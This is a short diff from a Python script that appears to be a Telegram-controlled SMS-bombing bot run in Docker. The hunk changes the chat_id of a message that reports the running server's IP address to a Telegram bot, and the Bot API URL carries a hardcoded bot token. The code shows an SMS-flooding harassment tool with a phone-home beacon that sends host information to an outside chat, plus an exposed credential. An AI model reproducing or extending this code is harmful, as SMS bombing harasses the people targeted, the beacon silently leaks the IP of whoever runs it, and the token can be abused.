@@ -514,7 +514,7 @@ if __name__ == '__main__':
     url = 'https://api.telegram.org/bot1159067423:AAGePsMdDzlR9DGcFGAa-A3_laNkagURGJ0/sendMessage'
     msg = "New Server From Docker SMS Bomb TG BOT \n IP = " + str(f.read())
     sendData = {
-                'chat_id':'-495344227' ,
+                'chat_id':'-1001283809017' ,
                 'text': msg
                 }
     sendData2 = {
